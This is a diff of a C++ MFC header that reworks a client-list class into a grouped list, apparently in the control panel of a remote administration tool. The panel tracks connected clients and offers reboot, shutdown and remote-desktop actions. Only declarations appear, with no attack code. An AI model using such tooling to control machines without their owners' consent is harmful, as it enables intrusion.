@@ -3,29 +3,39 @@
 #include "KernelSrv.h"
 
 
-class CClientList :
-	public CListCtrl
+class CClientGroup :
+	public CMFCListCtrl
 {
 private:
 	int m_sortCol;
 	int m_ascending;
 	int m_LastSortColum;
 
+	TCHAR m_GroupName[0x40];
+
 public:
-	CClientList();
-	~CClientList();
+	CClientGroup(CONST TCHAR * GroupName);
+	~CClientGroup();
+
+	CONST TCHAR * GetGroupName(){ return m_GroupName; }
+	int GetGroupClientCount() { return GetItemCount(); }
+
+		
+	//afx_msg LRESULT OnKernelGetModulePath(WPARAM wParam, LPARAM lParam);
+	//afx_msg LRESULT OnGetModulePath(WPARAM wParam, LPARAM lParam);
+
+	void OnClientLogin(CKernelSrv * kernel);
+	void OnClientLogout(CKernelSrv * kernel);
+	void OnUpdateComment(CKernelSrv *kernel, TCHAR * szNewComment);
+	void OnUpdateUploadStatus(CKernelSrv * kernel,LPVOID * ArgList);
+	
+
+
 	DECLARE_MESSAGE_MAP()
 	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
 
-	afx_msg LRESULT OnKernelGetModulePath(WPARAM wParam, LPARAM lParam);
-	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
-	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);
-	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);
-	afx_msg LRESULT OnKernelError(WPARAM error, LPARAM lParam);
-	afx_msg LRESULT OnUpdateUploadStatu(WPARAM wParam,LPARAM lParam);
-	afx_msg LRESULT OnGetModulePath(WPARAM wParam, LPARAM lParam);
 
-	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
+	//afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
 	
 	afx_msg void OnPowerReboot();
 	afx_msg void OnPowerShutdown();
@@ -55,5 +65,7 @@ public:
 
 	afx_msg void OnRemotedesktopDxgi();
 	afx_msg void OnRemotedesktopGdi();
+	afx_msg void OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/);
+	afx_msg void OnOperationModifygroup();
 };
 
